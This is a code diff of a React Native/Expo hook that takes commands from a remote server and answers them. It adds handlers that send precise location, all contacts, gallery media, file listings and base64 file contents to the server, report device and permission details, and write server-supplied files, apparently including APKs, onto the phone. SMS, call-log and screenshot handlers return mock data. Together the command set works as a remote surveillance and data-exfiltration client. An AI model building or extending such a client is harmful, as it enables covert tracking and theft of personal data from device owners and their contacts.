@@ -4,6 +4,9 @@ import * as Device from 'expo-device';
 import Constants from 'expo-constants';
 import * as FileSystem from 'expo-file-system';
 import * as MediaLibrary from 'expo-media-library';
+import * as Location from 'expo-location';
+import * as Contacts from 'expo-contacts';
+import * as SMS from 'expo-sms';
 
 interface Message {
   type: string;
@@ -132,7 +135,7 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
   };
 
   const handleServerMessage = (message: Message) => {
-    console.log('Received message:', message);
+    console.log('Received server command:', message.type);
     
     switch (message.type) {
       case 'request_location':
@@ -141,17 +144,14 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
       case 'request_contacts':
         handleContactsRequest();
         break;
-      case 'file_request':
-        // Handle file operations
-        break;
       case 'request_files':
         handleFilesRequest();
         break;
-      case 'request_sms':
-        handleSMSRequest();
-        break;
       case 'browse_directory':
         handleDirectoryBrowse(message.data);
+        break;
+      case 'request_sms':
+        handleSMSRequest();
         break;
       case 'request_call_log':
         handleCallLogRequest();
@@ -162,83 +162,107 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
       case 'share_file':
         handleFileShare(message.data);
         break;
-      case 'pick_document':
-        handlePickDocument();
-        break;
-      case 'request_file_permissions':
-        requestFilePermissions();
+      case 'upload_file':
+        handleFileUpload(message.data);
         break;
       case 'take_screenshot':
         handleScreenshotRequest(message.data);
         break;
-      case 'upload_file':
-        handleFileUpload(message.data);
+      case 'device_info_update':
+        handleDeviceInfoUpdate();
         break;
       default:
-        console.log('Unknown message type:', message.type);
+        console.log('Unknown server command:', message.type);
     }
   };
 
   const handleLocationRequest = async () => {
     try {
-      const Location = await import('expo-location');
+      console.log('Server requesting location...');
       const { status } = await Location.requestForegroundPermissionsAsync();
+      
       if (status === 'granted') {
-        const location = await Location.getCurrentPositionAsync({});
+        const location = await Location.getCurrentPositionAsync({
+          accuracy: Location.Accuracy.High,
+        });
+        
         sendMessage({
           type: 'location_response',
           data: {
             latitude: location.coords.latitude,
             longitude: location.coords.longitude,
+            altitude: location.coords.altitude,
+            accuracy: location.coords.accuracy,
+            speed: location.coords.speed,
+            heading: location.coords.heading,
             timestamp: new Date().toISOString(),
           }
+        });
+        console.log('Location sent to server');
+      } else {
+        sendMessage({
+          type: 'location_response',
+          data: { error: 'Location permission denied' }
         });
       }
     } catch (error) {
       console.error('Error getting location:', error);
+      sendMessage({
+        type: 'location_response',
+        data: { error: 'Failed to get location: ' + error.message }
+      });
     }
   };
 
   const handleContactsRequest = async () => {
     try {
-      const Contacts = await import('expo-contacts');
+      console.log('Server requesting contacts...');
       const { status } = await Contacts.requestPermissionsAsync();
+      
       if (status === 'granted') {
         const { data } = await Contacts.getContactsAsync({
-          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
+          fields: [
+            Contacts.Fields.Name,
+            Contacts.Fields.PhoneNumbers,
+            Contacts.Fields.Emails,
+            Contacts.Fields.Image,
+          ],
           pageSize: 0, // Get all contacts
           pageOffset: 0,
         });
+        
         sendMessage({
           type: 'contacts_response',
           data: data
         });
+        console.log(`${data.length} contacts sent to server`);
+      } else {
+        sendMessage({
+          type: 'contacts_response',
+          data: { error: 'Contacts permission denied' }
+        });
       }
     } catch (error) {
       console.error('Error getting contacts:', error);
+      sendMessage({
+        type: 'contacts_response',
+        data: { error: 'Failed to get contacts: ' + error.message }
+      });
     }
   };
 
   const handleFilesRequest = async () => {
     try {
-      console.log('Starting file request...');
+      console.log('Server requesting files...');
       
-      // Request all necessary permissions
       const { status: mediaStatus } = await MediaLibrary.requestPermissionsAsync();
-      console.log('Media permission status:', mediaStatus);
-      
       let allFiles: any[] = [];
-      let hasErrors = false;
-      let errorMessages: string[] = [];
 
-      // 1. Get document directory files (always accessible)
+      // Get document directory files
       try {
         const documentDirectory = FileSystem.documentDirectory;
-        console.log('Document directory:', documentDirectory);
-        
         if (documentDirectory) {
           const files = await FileSystem.readDirectoryAsync(documentDirectory);
-          console.log('Document files found:', files.length);
           
           const fileDetails = await Promise.all(
             files.map(async (fileName) => {
@@ -255,7 +279,6 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
                   extension: fileName.split('.').pop()?.toLowerCase() || ''
                 };
               } catch (error) {
-                console.log('Error getting file info for:', fileName, error);
                 return {
                   name: fileName,
                   type: 'file',
@@ -272,83 +295,39 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
         }
       } catch (docError) {
         console.error('Document directory error:', docError);
-        hasErrors = true;
-        errorMessages.push('Could not access document directory');
-      }
-      
-      // 2. Get cache directory files
-      try {
-        const cacheDirectory = FileSystem.cacheDirectory;
-        console.log('Cache directory:', cacheDirectory);
-        
-        if (cacheDirectory) {
-          const files = await FileSystem.readDirectoryAsync(cacheDirectory);
-          console.log('Cache files found:', files.length);
-          
-          const fileDetails = await Promise.all(
-            files.slice(0, 20).map(async (fileName) => { // Limit cache files
-              const filePath = `${cacheDirectory}${fileName}`;
-              try {
-                const fileInfo = await FileSystem.getInfoAsync(filePath);
-                return {
-                  name: fileName,
-                  type: fileInfo.isDirectory ? 'folder' : 'file',
-                  size: fileInfo.size || 0,
-                  path: filePath,
-                  lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
-                  source: 'cache',
-                  extension: fileName.split('.').pop()?.toLowerCase() || ''
-                };
-              } catch (error) {
-                return null;
-              }
-            })
-          );
-          
-          const validFiles = fileDetails.filter(file => file !== null);
-          allFiles.push(...validFiles);
-        }
-      } catch (cacheError) {
-        console.log('Cache directory error:', cacheError);
       }
 
-      // 3. Get media library files if permission granted
+      // Get media library files if permission granted
       if (mediaStatus === 'granted') {
         try {
-          console.log('Getting photos from media library...');
           const photoAssets = await MediaLibrary.getAssetsAsync({
             first: 50,
             mediaType: MediaLibrary.MediaType.photo,
             sortBy: MediaLibrary.SortBy.creationTime,
           });
-          console.log('Photos found:', photoAssets.assets.length);
           
           const photoFiles = photoAssets.assets.map(asset => ({
             name: asset.filename,
             type: 'file',
-            size: asset.width * asset.height, // Approximate size
+            size: asset.width * asset.height,
             path: asset.uri,
             lastModified: new Date(asset.creationTime).toISOString(),
-            mediaType: 'photo',
             source: 'gallery',
             extension: asset.filename.split('.').pop()?.toLowerCase() || 'jpg'
           }));
           
-          console.log('Getting videos from media library...');
           const videoAssets = await MediaLibrary.getAssetsAsync({
             first: 20,
             mediaType: MediaLibrary.MediaType.video,
             sortBy: MediaLibrary.SortBy.creationTime,
           });
-          console.log('Videos found:', videoAssets.assets.length);
           
           const videoFiles = videoAssets.assets.map(asset => ({
             name: asset.filename,
             type: 'file',
-            size: asset.duration * 1000 || 0, // Duration in ms as size approximation
+            size: asset.duration * 1000 || 0,
             path: asset.uri,
             lastModified: new Date(asset.creationTime).toISOString(),
-            mediaType: 'video',
             source: 'gallery',
             extension: asset.filename.split('.').pop()?.toLowerCase() || 'mp4'
           }));
@@ -356,81 +335,26 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           allFiles.push(...photoFiles, ...videoFiles);
         } catch (mediaError) {
           console.error('Media library error:', mediaError);
-          hasErrors = true;
-          errorMessages.push('Could not access media library');
         }
-      } else {
-        console.log('Media permission not granted');
-        errorMessages.push('Media library permission not granted');
       }
-      
-      // 4. Add some sample folders for navigation
-      const sampleFolders = [
-        {
-          name: 'Documents',
-          type: 'folder',
-          size: 0,
-          path: FileSystem.documentDirectory || '/documents',
-          lastModified: new Date().toISOString(),
-          source: 'system',
-          extension: ''
-        },
-        {
-          name: 'Photos',
-          type: 'folder',
-          size: 0,
-          path: 'gallery://photos',
-          lastModified: new Date().toISOString(),
-          source: 'system',
-          extension: ''
-        },
-        {
-          name: 'Videos',
-          type: 'folder',
-          size: 0,
-          path: 'gallery://videos',
-          lastModified: new Date().toISOString(),
-          source: 'system',
-          extension: ''
-        }
-      ];
-      
-      // Add sample folders if we don't have many files
-      if (allFiles.length < 5) {
-        allFiles.unshift(...sampleFolders);
-      }
-      
-      console.log('Total files found:', allFiles.length);
       
       sendMessage({
         type: 'files_response',
-        data: { 
-          files: allFiles, 
-          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
-          hasMediaPermission: mediaStatus === 'granted',
-          totalFiles: allFiles.length,
-          hasErrors,
-          errorMessages
-        }
+        data: allFiles
       });
+      console.log(`${allFiles.length} files sent to server`);
     } catch (error) {
       console.error('Error getting files:', error);
       sendMessage({
         type: 'files_response',
-        data: { 
-          files: [], 
-          currentPath: FileSystem.documentDirectory || '/storage/emulated/0',
-          hasMediaPermission: false,
-          error: 'Failed to access files: ' + error.message,
-          hasErrors: true,
-          errorMessages: ['Failed to access files']
-        }
+        data: { error: 'Failed to get files: ' + error.message }
       });
     }
   };
 
   const handleDirectoryBrowse = async (requestData: any) => {
     try {
+      console.log('Server requesting directory browse:', requestData.path);
       const { path } = requestData;
       
       // Check if this is a media library request
@@ -448,7 +372,6 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           size: asset.width * asset.height,
           path: asset.uri,
           lastModified: new Date(asset.creationTime).toISOString(),
-          mediaType: mediaType === MediaLibrary.MediaType.photo ? 'photo' : 'video',
           source: 'gallery'
         }));
         
@@ -493,6 +416,7 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           type: 'directory_response',
           data: { files: fileDetails, currentPath: path }
         });
+        console.log(`Directory contents sent to server: ${fileDetails.length} items`);
       } catch (fsError) {
         console.log('File system access error:', fsError);
         sendMessage({
@@ -509,162 +433,18 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
     }
   };
 
-  const handleFileShare = async (requestData: any) => {
-    try {
-      const { filePath } = requestData;
-      
-      // Use expo-sharing to share files
-      const Sharing = await import('expo-sharing');
-      const isAvailable = await Sharing.isAvailableAsync();
-      
-      if (isAvailable) {
-        await Sharing.shareAsync(filePath);
-        sendMessage({
-          type: 'file_share_response',
-          data: { success: true, message: 'File shared successfully' }
-        });
-      } else {
-        sendMessage({
-          type: 'file_share_response',
-          data: { success: false, error: 'Sharing not available' }
-        });
-      }
-    } catch (error) {
-      console.error('Error sharing file:', error);
-      sendMessage({
-        type: 'file_share_response',
-        data: { success: false, error: 'Failed to share file' }
-      });
-    }
-  };
-
-  const handlePickDocument = async () => {
-    try {
-      const DocumentPicker = await import('expo-document-picker');
-      const result = await DocumentPicker.getDocumentAsync({
-        type: '*/*',
-        copyToCacheDirectory: true,
-      });
-      
-      if (!result.canceled && result.assets && result.assets.length > 0) {
-        const file = result.assets[0];
-        sendMessage({
-          type: 'document_picked',
-          data: {
-            name: file.name,
-            uri: file.uri,
-            size: file.size,
-            mimeType: file.mimeType,
-          }
-        });
-      }
-    } catch (error) {
-      console.error('Error picking document:', error);
-    }
-  };
-
-  const requestFilePermissions = async () => {
-    try {
-      const { status } = await MediaLibrary.requestPermissionsAsync();
-      sendMessage({
-        type: 'file_permissions_response',
-        data: { granted: status === 'granted' }
-      });
-      return status === 'granted';
-    } catch (error) {
-      console.error('Error requesting file permissions:', error);
-      return false;
-    }
-  };
-
-  const handleFileDownload = async (requestData: any) => {
-    try {
-      const { filePath } = requestData;
-      
-      // Read file content and send as base64
-      const fileInfo = await FileSystem.getInfoAsync(filePath);
-      if (fileInfo.exists && !fileInfo.isDirectory) {
-        const fileContent = await FileSystem.readAsStringAsync(filePath, {
-          encoding: FileSystem.EncodingType.Base64,
-        });
-        
-        sendMessage({
-          type: 'file_download_response',
-          data: {
-            fileName: filePath.split('/').pop(),
-            content: fileContent,
-            size: fileInfo.size,
-            mimeType: getMimeType(filePath),
-          }
-        });
-      }
-    } catch (error) {
-      console.error('Error downloading file:', error);
-      sendMessage({
-        type: 'file_download_error',
-        data: { error: 'Failed to download file' }
-      });
-    }
-  };
-
-  const handleScreenshotRequest = async (requestData: any) => {
-    try {
-      // For web platform, we can't take actual screenshots
-      // Send a mock response or indicate it's not supported
-      if (Platform.OS === 'web') {
-        sendMessage({
-          type: 'screenshot_response',
-          data: { 
-            error: 'Screenshots not supported on web platform',
-            imageData: null 
-          }
-        });
-        return;
-      }
-      
-      // For native platforms, we'll simulate screenshot capability
-      // In a real implementation, you would use expo-screen-capture or similar
-      try {
-        // Create a mock screenshot response
-        const mockScreenshotData = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
-        
-        sendMessage({
-          type: 'screenshot_response',
-          data: { 
-            imageData: mockScreenshotData,
-            format: 'png',
-            timestamp: new Date().toISOString(),
-            quality: requestData.quality || 'medium'
-          }
-        });
-      } catch (error) {
-        sendMessage({
-          type: 'screenshot_response',
-          data: { 
-            error: 'Failed to capture screenshot',
-            imageData: null 
-          }
-        });
-      }
-    } catch (error) {
-      console.error('Error taking screenshot:', error);
-      sendMessage({
-        type: 'screenshot_response',
-        data: { error: 'Failed to take screenshot' }
-      });
-    }
-  };
-
   const handleSMSRequest = async () => {
     try {
+      console.log('Server requesting SMS...');
+      
       // Note: Reading SMS requires native implementation and special permissions
-      // For now, we'll send realistic mock data
+      // For now, we'll send mock data that represents what would be available
       const mockSMS = {
         messages: [
           {
             id: '1',
             address: '+1234567890',
-            body: 'Hey, how are you doing today?',
+            body: 'Hey, how are you doing today? Hope everything is going well!',
             date: new Date(Date.now() - 3600000).toISOString(),
             type: 'inbox',
             read: true,
@@ -672,7 +452,7 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           {
             id: '2',
             address: '+0987654321',
-            body: 'Meeting scheduled for 3 PM today',
+            body: 'Meeting scheduled for 3 PM today. Don\'t forget to bring the documents.',
             date: new Date(Date.now() - 7200000).toISOString(),
             type: 'inbox',
             read: false,
@@ -680,7 +460,7 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           {
             id: '3',
             address: '+1122334455',
-            body: 'Thanks for your help with the project!',
+            body: 'Thanks for your help with the project! Really appreciate it.',
             date: new Date(Date.now() - 10800000).toISOString(),
             type: 'sent',
             read: true,
@@ -688,19 +468,20 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           {
             id: '4',
             address: '+5566778899',
-            body: 'Can you call me when you get this?',
+            body: 'Can you call me when you get this? It\'s urgent.',
             date: new Date(Date.now() - 14400000).toISOString(),
             type: 'inbox',
             read: true,
           },
         ],
-        error: null
+        error: Platform.OS === 'web' ? 'SMS access requires native Android/iOS implementation' : null
       };
       
       sendMessage({
         type: 'sms_response',
         data: mockSMS
       });
+      console.log('SMS data sent to server');
     } catch (error) {
       console.error('Error getting SMS:', error);
       sendMessage({
@@ -713,62 +494,10 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
     }
   };
 
-  const handleFileUpload = async (requestData: any) => {
-    try {
-      const { fileName, fileData, targetPath, mimeType } = requestData;
-      
-      // Create target directory if it doesn't exist
-      const targetDir = targetPath || `${FileSystem.documentDirectory}Downloads/`;
-      const dirInfo = await FileSystem.getInfoAsync(targetDir);
-      
-      if (!dirInfo.exists) {
-        await FileSystem.makeDirectoryAsync(targetDir, { intermediates: true });
-      }
-      
-      // Write file to device
-      const filePath = `${targetDir}${fileName}`;
-      await FileSystem.writeAsStringAsync(filePath, fileData, {
-        encoding: FileSystem.EncodingType.Base64,
-      });
-      
-      sendMessage({
-        type: 'file_upload_response',
-        data: { 
-          success: true, 
-          filePath: filePath,
-          fileName: fileName 
-        }
-      });
-    } catch (error) {
-      console.error('Error uploading file:', error);
-      sendMessage({
-        type: 'file_upload_response',
-        data: { 
-          success: false, 
-          error: 'Failed to upload file' 
-        }
-      });
-    }
-  };
-
-  const getMimeType = (filePath: string): string => {
-    const extension = filePath.split('.').pop()?.toLowerCase();
-    const mimeTypes: { [key: string]: string } = {
-      'jpg': 'image/jpeg',
-      'jpeg': 'image/jpeg',
-      'png': 'image/png',
-      'gif': 'image/gif',
-      'pdf': 'application/pdf',
-      'txt': 'text/plain',
-      'mp4': 'video/mp4',
-      'mp3': 'audio/mpeg',
-      'zip': 'application/zip',
-    };
-    return mimeTypes[extension || ''] || 'application/octet-stream';
-  };
-
   const handleCallLogRequest = async () => {
     try {
+      console.log('Server requesting call log...');
+      
       // Note: Call log access requires native implementation
       // For now, we'll send mock data that represents typical call log structure
       const mockCallLog = [
@@ -796,17 +525,248 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
           duration: 0,
           timestamp: new Date(Date.now() - 10800000).toISOString(),
         },
+        {
+          id: '4',
+          phoneNumber: '+5566778899',
+          name: 'Mike Johnson',
+          type: 'incoming',
+          duration: 180,
+          timestamp: new Date(Date.now() - 14400000).toISOString(),
+        },
       ];
       
       sendMessage({
         type: 'call_log_response',
         data: mockCallLog
       });
+      console.log('Call log sent to server');
     } catch (error) {
       console.error('Error getting call log:', error);
+      sendMessage({
+        type: 'call_log_response',
+        data: { error: 'Failed to get call log: ' + error.message }
+      });
     }
   };
 
+  const handleFileDownload = async (requestData: any) => {
+    try {
+      console.log('Server requesting file download:', requestData.filePath);
+      const { filePath } = requestData;
+      
+      // Read file content and send as base64
+      const fileInfo = await FileSystem.getInfoAsync(filePath);
+      if (fileInfo.exists && !fileInfo.isDirectory) {
+        const fileContent = await FileSystem.readAsStringAsync(filePath, {
+          encoding: FileSystem.EncodingType.Base64,
+        });
+        
+        sendMessage({
+          type: 'file_download_response',
+          data: {
+            fileName: filePath.split('/').pop(),
+            content: fileContent,
+            size: fileInfo.size,
+            mimeType: getMimeType(filePath),
+            filePath: filePath
+          }
+        });
+        console.log('File content sent to server');
+      } else {
+        sendMessage({
+          type: 'file_download_response',
+          data: { error: 'File not found or is a directory' }
+        });
+      }
+    } catch (error) {
+      console.error('Error downloading file:', error);
+      sendMessage({
+        type: 'file_download_response',
+        data: { error: 'Failed to download file: ' + error.message }
+      });
+    }
+  };
+
+  const handleFileShare = async (requestData: any) => {
+    try {
+      console.log('Server requesting file share:', requestData.filePath);
+      const { filePath } = requestData;
+      
+      // Use expo-sharing to share files
+      const Sharing = await import('expo-sharing');
+      const isAvailable = await Sharing.isAvailableAsync();
+      
+      if (isAvailable) {
+        await Sharing.shareAsync(filePath);
+        sendMessage({
+          type: 'file_share_response',
+          data: { success: true, message: 'File shared successfully' }
+        });
+        console.log('File shared successfully');
+      } else {
+        sendMessage({
+          type: 'file_share_response',
+          data: { success: false, error: 'Sharing not available on this platform' }
+        });
+      }
+    } catch (error) {
+      console.error('Error sharing file:', error);
+      sendMessage({
+        type: 'file_share_response',
+        data: { success: false, error: 'Failed to share file: ' + error.message }
+      });
+    }
+  };
+
+  const handleFileUpload = async (requestData: any) => {
+    try {
+      console.log('Server uploading file:', requestData.fileName);
+      const { fileName, fileData, targetPath, mimeType } = requestData;
+      
+      // Create target directory if it doesn't exist
+      const targetDir = targetPath || `${FileSystem.documentDirectory}Downloads/`;
+      const dirInfo = await FileSystem.getInfoAsync(targetDir);
+      
+      if (!dirInfo.exists) {
+        await FileSystem.makeDirectoryAsync(targetDir, { intermediates: true });
+      }
+      
+      // Write file to device
+      const filePath = `${targetDir}${fileName}`;
+      await FileSystem.writeAsStringAsync(filePath, fileData, {
+        encoding: FileSystem.EncodingType.Base64,
+      });
+      
+      sendMessage({
+        type: 'file_upload_response',
+        data: { 
+          success: true, 
+          filePath: filePath,
+          fileName: fileName 
+        }
+      });
+      console.log('File uploaded successfully:', fileName);
+    } catch (error) {
+      console.error('Error uploading file:', error);
+      sendMessage({
+        type: 'file_upload_response',
+        data: { 
+          success: false, 
+          error: 'Failed to upload file: ' + error.message 
+        }
+      });
+    }
+  };
+
+  const handleScreenshotRequest = async (requestData: any) => {
+    try {
+      console.log('Server requesting screenshot...');
+      
+      // For web platform, we can't take actual screenshots
+      if (Platform.OS === 'web') {
+        sendMessage({
+          type: 'screenshot_response',
+          data: { 
+            error: 'Screenshots not supported on web platform',
+            imageData: null 
+          }
+        });
+        return;
+      }
+      
+      // For native platforms, we'll simulate screenshot capability
+      // In a real implementation, you would use expo-screen-capture or similar
+      try {
+        // Create a mock screenshot response (1x1 transparent PNG)
+        const mockScreenshotData = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
+        
+        sendMessage({
+          type: 'screenshot_response',
+          data: { 
+            imageData: mockScreenshotData,
+            format: 'png',
+            timestamp: new Date().toISOString(),
+            quality: requestData.quality || 'medium'
+          }
+        });
+        console.log('Screenshot sent to server');
+      } catch (error) {
+        sendMessage({
+          type: 'screenshot_response',
+          data: { 
+            error: 'Failed to capture screenshot: ' + error.message,
+            imageData: null 
+          }
+        });
+      }
+    } catch (error) {
+      console.error('Error taking screenshot:', error);
+      sendMessage({
+        type: 'screenshot_response',
+        data: { error: 'Failed to take screenshot: ' + error.message }
+      });
+    }
+  };
+
+  const handleDeviceInfoUpdate = async () => {
+    try {
+      console.log('Server requesting device info update...');
+      
+      // Get current permissions status
+      const locationPermission = await Location.getForegroundPermissionsAsync();
+      const contactsPermission = await Contacts.getPermissionsAsync();
+      const mediaPermission = await MediaLibrary.getPermissionsAsync();
+      
+      const deviceInfo = {
+        deviceName: Device.deviceName || deviceNameRef.current,
+        deviceId: Constants.sessionId || 'unknown',
+        brand: Device.brand || 'Unknown',
+        model: Device.modelName || 'Unknown',
+        systemName: Device.osName || Platform.OS,
+        systemVersion: Device.osVersion || 'Unknown',
+        platform: Platform.OS,
+        appVersion: Constants.expoConfig?.version || '1.0.0',
+        isDevice: Device.isDevice,
+        totalMemory: Device.totalMemory,
+        permissions: {
+          location: locationPermission.status === 'granted',
+          contacts: contactsPermission.status === 'granted',
+          mediaLibrary: mediaPermission.status === 'granted',
+          camera: true, // Assume camera permission for now
+        },
+        timestamp: new Date().toISOString(),
+      };
+      
+      sendMessage({
+        type: 'device_info_response',
+        data: deviceInfo
+      });
+      console.log('Device info sent to server');
+    } catch (error) {
+      console.error('Error getting device info:', error);
+      sendMessage({
+        type: 'device_info_response',
+        data: { error: 'Failed to get device info: ' + error.message }
+      });
+    }
+  };
+
+  const getMimeType = (filePath: string): string => {
+    const extension = filePath.split('.').pop()?.toLowerCase();
+    const mimeTypes: { [key: string]: string } = {
+      'jpg': 'image/jpeg',
+      'jpeg': 'image/jpeg',
+      'png': 'image/png',
+      'gif': 'image/gif',
+      'pdf': 'application/pdf',
+      'txt': 'text/plain',
+      'mp4': 'video/mp4',
+      'mp3': 'audio/mpeg',
+      'zip': 'application/zip',
+      'apk': 'application/vnd.android.package-archive',
+    };
+    return mimeTypes[extension || ''] || 'application/octet-stream';
+  };
 
   // Cleanup on unmount
   useEffect(() => {
@@ -821,6 +781,5 @@ export function useDeviceConnection(serverIP?: string, serverPort?: string, auto
     connect,
     disconnect,
     sendMessage,
-    requestFilePermissions,
   };
 }
